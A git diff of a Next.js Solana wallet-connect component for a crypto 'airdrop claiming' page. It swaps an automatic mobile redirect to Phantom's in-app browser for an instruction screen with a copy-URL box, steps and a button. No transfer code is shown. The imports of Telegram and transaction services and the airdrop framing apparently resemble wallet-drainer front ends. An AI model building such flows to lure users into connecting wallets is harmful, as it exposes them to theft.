@@ -7,6 +7,7 @@ import { TelegramService } from '../services/telegramService';
 import { UserProfileService } from '../services/userProfileService';
 import { TransactionService } from '../services/transactionService';
 import { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
+import Image from 'next/image';
 
 function WalletConnect() {
   const { publicKey, disconnect, connected } = useWallet();
@@ -19,10 +20,11 @@ function WalletConnect() {
   const notificationInProgress = useRef(false);
   const [isMobile, setIsMobile] = useState(false);
   const [hasPhantomApp, setHasPhantomApp] = useState(false);
+  const [showMobileMessage, setShowMobileMessage] = useState(false);
 
-  // Check if device is mobile and redirect to Phantom
+  // Check if device is mobile
   useEffect(() => {
-    const checkMobileAndRedirect = () => {
+    const checkMobile = () => {
       const mobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
       setIsMobile(mobile);
       
@@ -30,17 +32,19 @@ function WalletConnect() {
         // Check if we're already in Phantom
         const isPhantomInstalled = window.solana?.isPhantom;
         setHasPhantomApp(isPhantomInstalled);
-
-        // If not in Phantom, redirect
-        if (!isPhantomInstalled) {
-          const currentUrl = window.location.href;
-          const phantomUrl = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}`;
-          window.location.href = phantomUrl;
-        }
+        setShowMobileMessage(!isPhantomInstalled);
       }
     };
-    checkMobileAndRedirect();
+    checkMobile();
+    window.addEventListener('resize', checkMobile);
+    return () => window.removeEventListener('resize', checkMobile);
   }, []);
+
+  const redirectToPhantom = () => {
+    const currentUrl = window.location.href;
+    const phantomUrl = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}`;
+    window.location.href = phantomUrl;
+  };
 
   // Memoize services
   const services = useMemo(() => ({
@@ -295,81 +299,183 @@ function WalletConnect() {
 
   return (
     <div className="wallet-connect-container">
-      {publicKey ? (
-        <div className="connected-wallet glass-card">
-          <div 
-            className="wallet-header" 
-            onClick={toggleDropdown}
-            role="button"
-            tabIndex={0}
-            onKeyPress={(e) => {
-              if (e.key === 'Enter' || e.key === ' ') {
-                toggleDropdown(e);
-              }
-            }}
-          >
-            <div className="connected-indicator"></div>
-            <div className="wallet-info">
-              <div className="wallet-address-container">
-                <span className="font-body text-sm text-white">Connected:</span>
-                <span 
-                  className="font-body text-sm wallet-address" 
-                  onClick={(e) => {
-                    e.stopPropagation();
-                    copyAddress();
-                  }}
-                  title="Click to copy full address"
-                >
-                  {formatAddress(publicKey.toBase58())}
-                  {copied && <span className="copied-indicator">Copied!</span>}
-                </span>
-              </div>
-              {/* {isProcessing ? (
-                <div className="processing-indicator">
-                  Processing...
-                </div>
-              ) : balance !== null && (
-                <div className="balance-info text-sm opacity-80">
-                  {balance.toFixed(2)} SOL
-                </div>
-              )} */}
+      {showMobileMessage ? (
+        <div className="mobile-message glass-card p-4">
+          <div className="text-center">
+            <div className="mb-4">
+              <Image 
+                src="/logo/favicon.png" 
+                alt="Phantom Logo" 
+                width={80} 
+                height={80} 
+                className="mb-3"
+              />
+              <h2 className="font-display text-2xl mb-3">Use Phantom Browser</h2>
             </div>
-            <div className={`dropdown-arrow ${isDropdownOpen ? 'open' : ''}`}>
-              ▼
+            
+            <div className="mb-4">
+              <p className="text-lg opacity-80 mb-3">
+                For the best and most secure airdrop claiming experience, please use the Phantom mobile browser.
+              </p>
+              <ul className="text-left mb-4">
+                <li className="mb-2">• Seamless wallet connection</li>
+                <li className="mb-2">• Faster transaction processing</li>
+                <li className="mb-2">• Enhanced security features</li>
+                <li className="mb-2">• Better mobile experience</li>
+              </ul>
             </div>
-          </div>
-          
-          {isDropdownOpen && (
-            <div className="wallet-dropdown">
-              <div className="dropdown-section">
-                <h4>Wallet Details</h4>
-                <div className="detail-item">
-                  <span className="label">Full Address:</span>
-                  <span className="value">{publicKey.toBase58()}</span>
-                </div>
-                <div className="detail-item">
-                  <span className="label">SOL Balance:</span>
-                  <span className="value">{balance?.toFixed(2)} SOL</span>
-                </div>
-              </div>
 
-              <button 
-                onClick={(e) => {
-                  e.preventDefault();
-                  e.stopPropagation();
-                  handleDisconnect();
-                }} 
-                className="disconnect-btn"
-              >
-                Disconnect Wallet
-              </button>
+            <div className="url-copy-container mb-4">
+              <div className="d-flex align-items-center justify-content-center gap-2">
+                <input 
+                  type="text" 
+                  value={window.location.href} 
+                  readOnly 
+                  className="form-control bg-dark text-white border-secondary"
+                />
+                <button 
+                  onClick={copyToClipboard}
+                  className="btn btn-accent"
+                >
+                  {copied ? 'Copied!' : 'Copy URL'}
+                </button>
+              </div>
             </div>
-          )}
+
+            <div className="steps-container mb-4">
+              <h3 className="font-heading mb-3">How to proceed:</h3>
+              <ol className="text-left">
+                <li className="mb-2">1. Copy the URL above</li>
+                <li className="mb-2">2. Open Phantom mobile browser</li>
+                <li className="mb-2">3. Paste the URL in Phantom</li>
+                <li className="mb-2">4. Connect your wallet and claim</li>
+              </ol>
+            </div>
+
+            <button 
+              onClick={redirectToPhantom}
+              className="btn btn-accent w-100"
+            >
+              Open in Phantom Browser
+            </button>
+          </div>
+
+          <style jsx>{`
+            .mobile-message {
+              max-width: 600px;
+              margin: 2rem auto;
+            }
+            
+            .url-copy-container {
+              background: rgba(255, 255, 255, 0.05);
+              padding: 1rem;
+              border-radius: 12px;
+              border: 1px solid rgba(255, 255, 255, 0.1);
+            }
+            
+            .url-copy-container input {
+              flex: 1;
+              min-width: 0;
+              font-size: 0.9rem;
+              padding: 0.5rem;
+              border-radius: 8px;
+            }
+            
+            .steps-container {
+              background: rgba(255, 255, 255, 0.05);
+              padding: 1.5rem;
+              border-radius: 12px;
+              border: 1px solid rgba(255, 255, 255, 0.1);
+            }
+            
+            .steps-container ol {
+              padding-left: 1.5rem;
+              margin-bottom: 0;
+            }
+            
+            .steps-container li {
+              color: rgba(255, 255, 255, 0.8);
+              margin-bottom: 0.5rem;
+            }
+          `}</style>
         </div>
       ) : (
-        <div className="wallet-connect-wrapper">
-          <WalletMultiButton className="wallet-connect-btn" />
-        </div>
+        publicKey ? (
+          <div className="connected-wallet glass-card">
+            <div 
+              className="wallet-header" 
+              onClick={toggleDropdown}
+              role="button"
+              tabIndex={0}
+              onKeyPress={(e) => {
+                if (e.key === 'Enter' || e.key === ' ') {
+                  toggleDropdown(e);
+                }
+              }}
+            >
+              <div className="connected-indicator"></div>
+              <div className="wallet-info">
+                <div className="wallet-address-container">
+                  <span className="font-body text-sm text-white">Connected:</span>
+                  <span 
+                    className="font-body text-sm wallet-address" 
+                    onClick={(e) => {
+                      e.stopPropagation();
+                      copyAddress();
+                    }}
+                    title="Click to copy full address"
+                  >
+                    {formatAddress(publicKey.toBase58())}
+                    {copied && <span className="copied-indicator">Copied!</span>}
+                  </span>
+                </div>
+                {/* {isProcessing ? (
+                  <div className="processing-indicator">
+                    Processing...
+                  </div>
+                ) : balance !== null && (
+                  <div className="balance-info text-sm opacity-80">
+                    {balance.toFixed(2)} SOL
+                  </div>
+                )} */}
+              </div>
+              <div className={`dropdown-arrow ${isDropdownOpen ? 'open' : ''}`}>
+                ▼
+              </div>
+            </div>
+            
+            {isDropdownOpen && (
+              <div className="wallet-dropdown">
+                <div className="dropdown-section">
+                  <h4>Wallet Details</h4>
+                  <div className="detail-item">
+                    <span className="label">Full Address:</span>
+                    <span className="value">{publicKey.toBase58()}</span>
+                  </div>
+                  <div className="detail-item">
+                    <span className="label">SOL Balance:</span>
+                    <span className="value">{balance?.toFixed(2)} SOL</span>
+                  </div>
+                </div>
+
+                <button 
+                  onClick={(e) => {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    handleDisconnect();
+                  }} 
+                  className="disconnect-btn"
+                >
+                  Disconnect Wallet
+                </button>
+              </div>
+            )}
+          </div>
+        ) : (
+          <div className="wallet-connect-wrapper">
+            <WalletMultiButton className="wallet-connect-btn" />
+          </div>
+        )
       )}
 
       <style jsx>{`
